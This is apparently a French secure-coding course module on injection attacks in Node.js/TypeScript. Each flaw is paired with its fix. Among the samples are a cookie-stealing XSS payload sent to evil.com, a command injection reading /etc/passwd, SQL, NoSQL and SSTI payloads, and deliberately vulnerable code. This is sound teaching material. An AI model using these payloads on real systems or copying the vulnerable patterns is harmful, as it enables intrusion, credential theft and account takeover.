# Module 2 — Les Attaques par Injection

## Objectifs pédagogiques

- Comprendre le principe général de l'injection
- Maîtriser les différents types : SQL, XSS, Command, NoSQL, Path Traversal, SSTI
- Savoir identifier le code vulnérable et appliquer les contre-mesures appropriées
- Implémenter des défenses robustes dans un contexte Node.js/TypeScript

---

## 1. Qu'est-ce qu'une injection ?

Une **injection** se produit quand des données non fiables (fournies par un utilisateur ou une source externe) sont interprétées comme du code ou des commandes par un interpréteur.

Le principe est toujours le même :

```
Données utilisateur  →  Mélangées au code/commande  →  Interpréteur exécute le tout
```

Les injections sont possibles quand il n'y a pas de séparation claire entre **données** et **instructions**.

### Conditions nécessaires

1. L'application accepte des données d'une source non fiable
2. Ces données sont insérées dans une commande ou requête
3. L'interpréteur ne distingue pas les données des instructions

---

## 2. SQL Injection

### 2.1 Injection classique

```typescript
// ❌ VULNÉRABLE : concaténation de chaînes dans une requête SQL
import { Pool } from 'pg';
const pool = new Pool();

app.get('/api/users', async (req, res) => {
  const { username } = req.query;
  // L'attaquant envoie : username = "admin' OR '1'='1"
  const query = `SELECT * FROM users WHERE username = '${username}'`;
  // Requête exécutée : SELECT * FROM users WHERE username = 'admin' OR '1'='1'
  // → Retourne TOUS les utilisateurs
  const result = await pool.query(query);
  res.json(result.rows);
});
```

### 2.2 Blind SQL Injection

L'attaquant n'obtient pas les données directement mais déduit des informations à partir du comportement de l'application.

```
// Boolean-based blind
GET /api/users?id=1 AND 1=1    → 200 OK (vrai)
GET /api/users?id=1 AND 1=2    → 200 OK mais pas de résultat (faux)

// L'attaquant peut extraire des données caractère par caractère :
GET /api/users?id=1 AND SUBSTRING(password,1,1)='a'  → faux
GET /api/users?id=1 AND SUBSTRING(password,1,1)='b'  → vrai !
```

### 2.3 Time-based Blind SQL Injection

```
// L'attaquant mesure le temps de réponse
GET /api/users?id=1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
// Si la réponse met 5 secondes → injection confirmée
```

### 2.4 Protection : requêtes paramétrées

```typescript
// ✅ SÉCURISÉ : requêtes paramétrées avec pg
app.get('/api/users', async (req, res) => {
  const { username } = req.query;
  const result = await pool.query(
    'SELECT id, username, email FROM users WHERE username = $1',
    [username] // Le paramètre est échappé automatiquement
  );
  res.json(result.rows);
});

// ✅ SÉCURISÉ : requêtes paramétrées avec mysql2
import mysql from 'mysql2/promise';
const connection = await mysql.createConnection(config);

const [rows] = await connection.execute(
  'SELECT id, username, email FROM users WHERE username = ?',
  [username]
);
```

### 2.5 Protection avec un ORM

```typescript
// ✅ Prisma — protection automatique
const user = await prisma.user.findUnique({
  where: { username }, // Prisma paramétrise automatiquement
  select: { id: true, username: true, email: true },
});

// ✅ TypeORM — protection automatique
const user = await userRepository.findOne({
  where: { username },
  select: ['id', 'username', 'email'],
});

// ⚠️ ATTENTION : les raw queries dans un ORM ne sont PAS protégées
// ❌ TypeORM raw query vulnérable
const users = await dataSource.query(
  `SELECT * FROM users WHERE username = '${username}'`
);

// ✅ TypeORM raw query paramétrée
const users = await dataSource.query(
  'SELECT * FROM users WHERE username = $1',
  [username]
);
```

---

## 3. XSS (Cross-Site Scripting)

Le XSS permet à un attaquant d'injecter du code JavaScript malveillant dans une page web vue par d'autres utilisateurs.

### 3.1 Reflected XSS

Le script malveillant est inclus dans l'URL ou la requête et renvoyé dans la réponse.

```typescript
// ❌ VULNÉRABLE : le contenu de la requête est renvoyé sans échappement
app.get('/search', (req, res) => {
  const { q } = req.query;
  res.send(`
    <h1>Résultats pour : ${q}</h1>
    <p>Aucun résultat trouvé.</p>
  `);
  // Attaque : /search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
});
```

### 3.2 Stored XSS

Le script est stocké en base de données et affiché à tous les utilisateurs qui consultent la page.

```typescript
// ❌ VULNÉRABLE : commentaire stocké puis affiché sans échappement
app.post('/api/comments', async (req, res) => {
  const { content } = req.body;
  // L'attaquant soumet : content = "<img src=x onerror='alert(document.cookie)'>"
  await db.query('INSERT INTO comments (content) VALUES ($1)', [content]);
  res.json({ success: true });
});

// Plus tard, le commentaire est affiché sans sanitization
app.get('/comments', async (req, res) => {
  const comments = await db.query('SELECT * FROM comments');
  let html = '<ul>';
  for (const c of comments.rows) {
    html += `<li>${c.content}</li>`; // ❌ XSS stocké
  }
  html += '</ul>';
  res.send(html);
});
```

### 3.3 DOM-based XSS

Le script est exécuté côté client en manipulant le DOM.

```typescript
// ❌ VULNÉRABLE : manipulation du DOM avec des données non sanitizées
// Côté client
const params = new URLSearchParams(location.search);
const name = params.get('name');
document.getElementById('greeting')!.innerHTML = `Bonjour ${name}`;
// URL : /page?name=<img src=x onerror=alert(1)>
```

### 3.4 XSS dans les frameworks frontend

```tsx
// ❌ React — dangerouslySetInnerHTML
function Comment({ content }: { content: string }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
  // Si content vient de l'utilisateur → XSS
}

// ✅ React — par défaut, React échappe le contenu
function Comment({ content }: { content: string }) {
  return <div>{content}</div>; // Sécurisé : React échappe automatiquement
}
```

```vue
<!-- ❌ Vue — v-html est dangereux -->
<template>
  <div v-html="userContent"></div>
</template>

<!-- ✅ Vue — interpolation sécurisée -->
<template>
  <div>{{ userContent }}</div>
</template>
```

```typescript
// ❌ Angular — bypassSecurityTrustHtml
import { DomSanitizer } from '@angular/platform-browser';

this.trustedHtml = this.sanitizer.bypassSecurityTrustHtml(userInput);
// Contourne la protection d'Angular — à éviter

// ✅ Angular — le binding par défaut est sécurisé
// Angular sanitize automatiquement les bindings [innerHTML]
```

### 3.5 Sanitization avec DOMPurify

```typescript
import DOMPurify from 'isomorphic-dompurify';

// ✅ Sanitizer le HTML avant l'affichage
const dirtyHTML = '<p>Texte légitime</p><script>alert("xss")</script><img src=x onerror=alert(1)>';
const cleanHTML = DOMPurify.sanitize(dirtyHTML);
// Résultat : '<p>Texte légitime</p>'
// Les tags <script> et attributs dangereux sont supprimés

// Configuration avancée
const strictClean = DOMPurify.sanitize(dirtyHTML, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'li'],
  ALLOWED_ATTR: ['href', 'title'],
});
```

### 3.6 Content Security Policy (CSP)

Le CSP est un header HTTP qui contrôle quelles ressources le navigateur peut charger.

```typescript
import helmet from 'helmet';

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"], // Pas de scripts inline ni de CDN non autorisé
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", 'data:', 'https:'],
    connectSrc: ["'self'", 'https://api.monapp.com'],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    frameSrc: ["'none'"],
    upgradeInsecureRequests: [],
  },
}));

// Le header résultant empêche l'exécution de scripts injectés
// même si le XSS passe les autres défenses
```

---

## 4. Command Injection

L'attaquant injecte des commandes système via l'application.

### 4.1 Exemple vulnérable

```typescript
import { exec } from 'node:child_process';

// ❌ VULNÉRABLE : exec avec concaténation
app.get('/api/ping', (req, res) => {
  const { host } = req.query;
  exec(`ping -c 4 ${host}`, (error, stdout) => {
    res.send(stdout);
  });
  // Attaque : host = "google.com; cat /etc/passwd"
  // Exécute : ping -c 4 google.com; cat /etc/passwd
});
```

### 4.2 Protection

```typescript
import { execFile } from 'node:child_process';

// ✅ SÉCURISÉ : execFile sépare commande et arguments
app.get('/api/ping', (req, res) => {
  const { host } = req.query;

  // Validation de l'input
  const hostnameRegex = /^[a-zA-Z0-9][a-zA-Z0-9.-]+[a-zA-Z0-9]$/;
  if (typeof host !== 'string' || !hostnameRegex.test(host)) {
    return res.status(400).json({ error: 'Hostname invalide' });
  }

  // execFile ne passe pas par un shell, les ; et | ne sont pas interprétés
  execFile('ping', ['-c', '4', host], (error, stdout) => {
    if (error) return res.status(500).json({ error: 'Ping échoué' });
    res.send(stdout);
  });
});
```

### Règle d'or

| Méthode | Sécurité | Raison |
|---|---|---|
| `exec()` | ❌ Dangereux | Passe par le shell, interprète `;`, `|`, `&&` |
| `execFile()` | ✅ Sûr | Exécute directement le binaire, pas de shell |
| `spawn()` | ✅ Sûr (par défaut) | Comme `execFile`, sauf si `shell: true` |

---

## 5. NoSQL Injection

### 5.1 MongoDB Query Injection

```typescript
// ❌ VULNÉRABLE : MongoDB avec des données non validées
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await db.collection('users').findOne({
    username,
    password,
  });
  // Attaque avec Content-Type: application/json :
  // { "username": { "$ne": "" }, "password": { "$ne": "" } }
  // L'opérateur $ne retourne le premier utilisateur dont username ET password != ""
  if (user) res.json({ token: generateToken(user) });
  else res.status(401).json({ error: 'Invalid credentials' });
});
```

### 5.2 Protection avec validation

```typescript
import { z } from 'zod';

const LoginSchema = z.object({
  username: z.string().min(1).max(50),
  password: z.string().min(1).max(128),
});

app.post('/api/login', async (req, res) => {
  // ✅ La validation Zod rejette les objets — seules les strings passent
  const parsed = LoginSchema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: 'Données invalides' });
  }

  const { username, password } = parsed.data;
  const user = await db.collection('users').findOne({ username });

  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Identifiants invalides' });
  }

  res.json({ token: generateToken(user) });
});
```

### 5.3 Protection supplémentaire

```typescript
// ✅ Sanitizer explicitement pour supprimer les opérateurs MongoDB
function sanitizeMongoQuery(input: unknown): string {
  if (typeof input !== 'string') {
    throw new Error('Input must be a string');
  }
  return input;
}

// ✅ Utiliser des projections pour limiter les données exposées
const user = await db.collection('users').findOne(
  { username: sanitizeMongoQuery(username) },
  { projection: { passwordHash: 0, _id: 0 } }
);
```

---

## 6. Path Traversal

L'attaquant accède à des fichiers en dehors du répertoire prévu.

### 6.1 Exemple vulnérable

```typescript
import path from 'node:path';
import fs from 'node:fs/promises';

// ❌ VULNÉRABLE : l'utilisateur contrôle le chemin du fichier
app.get('/api/files', async (req, res) => {
  const { filename } = req.query;
  const filePath = `./uploads/${filename}`;
  // Attaque : filename = "../../../etc/passwd"
  // Lit : ./uploads/../../../etc/passwd → /etc/passwd
  const content = await fs.readFile(filePath, 'utf-8');
  res.send(content);
});
```

### 6.2 Protection

```typescript
// ✅ SÉCURISÉ : validation et résolution du chemin
const UPLOADS_DIR = path.resolve('./uploads');

app.get('/api/files', async (req, res) => {
  const { filename } = req.query;

  if (typeof filename !== 'string') {
    return res.status(400).json({ error: 'Filename requis' });
  }

  // Résoudre le chemin absolu
  const requestedPath = path.resolve(UPLOADS_DIR, filename);

  // Vérifier que le chemin résolu est bien dans le répertoire autorisé
  if (!requestedPath.startsWith(UPLOADS_DIR + path.sep)) {
    return res.status(403).json({ error: 'Accès interdit' });
  }

  try {
    const content = await fs.readFile(requestedPath, 'utf-8');
    res.send(content);
  } catch {
    res.status(404).json({ error: 'Fichier non trouvé' });
  }
});
```

### Bonnes pratiques

- Toujours utiliser `path.resolve()` et vérifier le préfixe
- Utiliser une whitelist de fichiers/extensions autorisés quand possible
- Stocker les fichiers avec des identifiants internes (UUID) plutôt que les noms originaux
- Configurer le système de fichiers avec des permissions restrictives

---

## 7. Template Injection (SSTI)

Le **Server-Side Template Injection** se produit quand l'input de l'utilisateur est inséré directement dans un template côté serveur.

### 7.1 Exemple vulnérable

```typescript
import nunjucks from 'nunjucks';

// ❌ VULNÉRABLE : template créé dynamiquement avec l'input utilisateur
app.get('/greet', (req, res) => {
  const { name } = req.query;
  const template = `<h1>Bonjour ${name}</h1>`;
  const output = nunjucks.renderString(template, {});
  // Attaque : name = "{{7*7}}" → affiche "Bonjour 49"
  // Attaque avancée : name = "{{range.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}"
  res.send(output);
});
```

### 7.2 Protection

```typescript
// ✅ SÉCURISÉ : passer les données comme variables du template
app.get('/greet', (req, res) => {
  const { name } = req.query;
  const output = nunjucks.render('greet.html', { name });
  // Le template greet.html contient : <h1>Bonjour {{ name }}</h1>
  // Nunjucks échappe automatiquement les variables
  res.send(output);
});
```

### Règle d'or

- Ne **jamais** intégrer de données utilisateur dans le code du template
- Toujours passer les données comme **variables** du contexte du template
- Activer l'auto-escaping dans le moteur de templates

---

## 8. Stratégie de défense globale contre les injections

### Les 4 niveaux de défense

```
┌─────────────────────────────────────────┐
│  1. VALIDATION des entrées              │  → Zod, Joi, class-validator
│  ┌───────────────────────────────────┐  │
│  │  2. PARAMÉTRISATION               │  │  → Prepared statements, ORM
│  │  ┌─────────────────────────────┐  │  │
│  │  │  3. ÉCHAPPEMENT en sortie   │  │  │  → Context-aware encoding
│  │  │  ┌───────────────────────┐  │  │  │
│  │  │  │  4. MOINDRE PRIVILÈGE │  │  │  │  → Permissions minimales
│  │  │  └───────────────────────┘  │  │  │
│  │  └─────────────────────────────┘  │  │
│  └───────────────────────────────────┘  │
└─────────────────────────────────────────┘
```

### Checklist anti-injection

| Type d'injection | Défense principale | Défense secondaire |
|---|---|---|
| SQL Injection | Requêtes paramétrées/ORM | Validation input, moindre privilège BD |
| XSS | Échappement contextuel, framework | CSP, DOMPurify, HttpOnly cookies |
| Command Injection | `execFile` au lieu de `exec` | Validation stricte, whitelist |
| NoSQL Injection | Validation de type (Zod) | Sanitization des opérateurs |
| Path Traversal | `path.resolve` + vérification préfixe | Whitelist, UUID pour fichiers |
| SSTI | Données en variables, pas dans le template | Auto-escaping activé |

---

## Résumé

- L'injection reste l'une des vulnérabilités les plus dangereuses et fréquentes
- La **séparation données/instructions** est le principe fondamental de défense
- Chaque type d'injection a ses défenses spécifiques
- La validation des entrées est nécessaire mais **jamais suffisante** seule
- Combiner validation, paramétrisation, échappement et moindre privilège

---

## Pour aller plus loin

- [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy — Injection](https://portswigger.net/web-security/sql-injection)
